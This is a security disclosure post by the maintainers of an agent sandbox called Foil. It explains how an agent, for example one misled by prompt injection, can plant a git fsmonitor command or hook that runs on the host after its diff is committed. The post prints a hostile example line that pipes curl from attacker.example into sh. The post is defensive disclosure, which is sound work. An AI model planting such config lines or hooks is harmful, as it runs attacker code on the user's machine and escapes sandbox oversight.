Your agent's sandbox is fine. Its diff can still run code on your machine

5 November 2026 · The Foil maintainers

We build Foil, a local sandbox for coding agents. The agent works in a copy-on-write branch of your repo; you review the diff and commit it. While writing down what Foil does and doesn't defend against, we found a hole in that last step. Not in the sandbox: in what comes out of it. Foil 0.4.1 fixes it. The pattern isn't specific to Foil, so here is how it works and how to check your own setup.

Three lines

Git runs some things without asking. One is core.fsmonitor: a command in the repository's config that git runs on git status, git diff and most other commands, to ask which files changed. Hooks are another: scripts in .git/hooks that run on commit, checkout, merge and push.

Both live inside the repository, in .git. So an agent, sandboxed or not, that can write to the repo's .git can do this:

printf '[core]\n\tfsmonitor = "curl -s https://attacker.example/x | sh; false"\n' >> .git/config

Inside a good sandbox, nothing happens: the network is closed, the home folder is hidden. But if that change reaches your real repository, the next git status you type runs it as you, outside any sandbox. A misled agent only needs to be misled once, say by a prompt injection in an issue it was asked to fix.

What we saw in Foil 0.4.0

We ran the attack against our own release. A strict Foil run (empty home, no network) wrote the config line above, a post-commit hook, and a one-line change to a.txt. Then:

$ foil diff evil
M .git/config
A .git/hooks/post-commit
M a.txt
$ foil commit evil
applied 3 changes
$ git status          # runs the agent's fsmonitor command, on the host

The diff was honest: it listed both files. But two lines among dozens, next to the agent's real work, are easy to approve without reading. A review step only protects you if the dangerous changes stand out.

What 0.4.1 does

  • Commit leaves them out. Everything in a .git folder except git's data is held back: config, hooks, info/attributes, submodule config, and a new or replaced .git (which may be a file pointing somewhere else). Git's data still comes through, so an agent's own git commit inside the branch reaches your repo: objects, refs, the index, logs.
  • Diff marks them. foil diff shows [guarded] next to each, --json has "guarded": true, and commit names what it left out.
  • You can still apply them, after reading them, with foil commit --guarded.
$ foil diff evil
M .git/config  [guarded]
A .git/hooks/post-commit  [guarded]
M a.txt
$ foil commit evil
applied 1 change
foil: left out 2 paths that git would run on your machine (git config, hooks or a new .git), discarded with the branch

The same release closes a smaller macOS gap the same review turned up: a strict run could read and write /tmp and your own temp folder, where other programs and other runs keep files. It now gets a temp folder of its own. Linux runs already had a private /tmp.

Check your own setup

Whatever runs your agents, ask where its writes to .git go:

  • A git worktree per agent. Worktrees share the main repository's config. Run git config core.fsmonitor ... in an agent's worktree, and it is set for your main checkout immediately, no merge needed. We checked with git on macOS. Worktrees keep agents from overwriting each other's files; they don't keep them out of your git config.
  • A container with the repo mounted. The agent writes your real .git directly. Mount .git read-only, or give the container a clone.
  • Agent edits applied as a patch or a PR. Usually safe: a patch or a push carries tracked files, not .git/config or hooks. Check that your tool doesn't copy the working folder back instead.
  • Files that run when you use them. A Makefile, a package.json script, .envrc, .vscode/tasks.json. These are ordinary changes in any tool, Foil included, and they run when you run them. direnv and VS Code ask before running new ones; make and npm test don't. Read them in the diff.

Why we're publishing this

Foil says plainly that it shares your kernel and is for agents that are wrong or misled, not hostile code. That promise is only worth something if we go looking for the ways it breaks and say what we find. SECURITY.md lists every guarantee with the test that tries to break it, and what Foil doesn't cover. This finding now has its test there too: commit_leaves_out_git_config_and_hooks_unless_asked.

If you find another way out, please report it privately through GitHub's vulnerability reporting.
